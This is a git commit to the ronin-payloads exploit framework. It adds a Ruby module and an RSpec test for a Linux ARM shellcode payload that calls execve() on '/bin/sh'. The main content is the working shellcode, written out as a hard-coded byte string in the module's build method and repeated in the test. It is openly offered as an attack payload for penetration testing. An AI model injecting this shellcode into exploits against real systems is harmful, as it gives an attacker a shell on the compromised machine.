8ecd0d12d2802bbddb5f58401ccb8812b798c924
Postmodern <postmodern.mod3@gmail.com>
2022-12-09 20:35:38 -0800

    Added a Linux ARM `execve()` shellcode payload (issue #42).

---
+++ lib/ronin/payloads/builtin/shellcode/linux/arm/execve.rb
@@ -0,0 +1,60 @@
+# frozen_string_literal: true
+#
+# ronin-payloads - A Ruby micro-framework for writing and running exploit
+# payloads.
+#
+# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
+#
+# ronin-payloads is free software: you can redistribute it and/or modify
+# it under the terms of the GNU Lesser General Public License as published
+# by the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# ronin-payloads is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU Lesser General Public License for more details.
+#
+# You should have received a copy of the GNU Lesser General Public License
+# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
+#
+
+require 'ronin/payloads/shellcode_payload'
+
+module Ronin
+  module Payloads
+    module Shellcode
+      module Linux
+        module ARM
+          class Execve < ShellcodePayload
+
+            register 'shellcode/linux/arm/execve'
+
+            arch :arm
+            os :linux
+
+            author "Jonathan 'dummys' Borgeaud", twitter: 'dummys1337',
+                                                 website: 'fapperz.org'
+
+            summary 'Linux ARM execve() shellcode'
+            description <<~DESC
+            Linux ARM shellcode that calls execve() with "/bin/sh".
+            DESC
+
+            references [
+              "https://shell-storm.org/shellcode/files/shellcode-904.html"
+            ]
+
+            #
+            # Builds the shellcode.
+            #
+            def build
+              @payload = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68".b
+            end
+
+          end
+        end
+      end
+    end
+  end
+end
---
+++ spec/builtin/shellcode/linux/arm/execve_spec.rb
@@ -0,0 +1,46 @@
+require 'spec_helper'
+require 'ronin/payloads/builtin/shellcode/linux/arm/execve'
+
+describe Ronin::Payloads::Shellcode::Linux::ARM::Execve do
+  it "must inherit from Ronin::Payloads::ShellcodePayload" do
+    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
+  end
+
+  describe ".id" do
+    subject { described_class }
+
+    it "must equal 'shellcode/linux/arm/execve'" do
+      expect(subject.id).to eq('shellcode/linux/arm/execve')
+    end
+  end
+
+  describe ".arch" do
+    subject { described_class }
+
+    it "must equal :arm" do
+      expect(subject.arch).to be(:arm)
+    end
+  end
+
+  describe ".os" do
+    subject { described_class }
+
+    it "must equal :linux" do
+      expect(subject.os).to be(:linux)
+    end
+  end
+
+  describe "#build" do
+    before { subject.build }
+
+    it "must set #payload" do
+      expect(subject.payload).to eq(
+        "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68".b
+      )
+    end
+
+    it "must ensure #payload is an ASCII 8bit string" do
+      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
+    end
+  end
+end
